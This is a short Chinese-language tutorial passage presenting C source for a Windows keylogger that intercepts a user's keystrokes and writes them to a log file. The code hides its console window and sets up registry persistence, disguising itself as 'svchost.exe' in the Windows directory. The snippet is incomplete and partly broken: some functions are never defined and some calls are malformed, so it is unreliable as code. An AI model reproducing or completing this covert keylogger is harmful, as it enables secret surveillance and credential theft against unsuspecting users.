
让我们来看一个开发键盘记录器的 C 程序。通过这个程序，你可以拦截用户按下的按键，并将这些按键存储在日志文件中。

```c
#include<windows.h>
#include<stdio.h>
#include<winuser.h>
#include<windowsx.h>
#define BUFSIZE 80
int test_key(void);
int create_key(char);
int get_keys(void);
int main(void)
{
    HWND stealth; //创建一个隐藏窗口
    AllocConsole();
    stealth=FindWindowA("ConsoleClass",NULL);
    ShowWindow(stealth,0);
    int test,create;
    test=test_key();//检查按键是否可以打开
    if (test==2)// 创建按键
    {
        char *path="c:\\%windir%\\svchost.exe";//文件需要存储的路径
        create=create_key(path);
    }
    int t=get_keys();
    return t;
}
```

```c
int test_key(void)
{
int check;
HKEY hKey;
char path[BUFSIZE];
DWORD buf_length=BUFSIZE;
int reg_key;
reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft");
if(reg_key!=0)
{
  check=1;
  return check;
}
reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,path,&buf_length);
if((reg_key!=0)|(buf_length>BUFSIZE)){
  check=2;
}
if(reg_key==0)
{
  check=0;
  RegCloseKey(hKey);
}
}
```
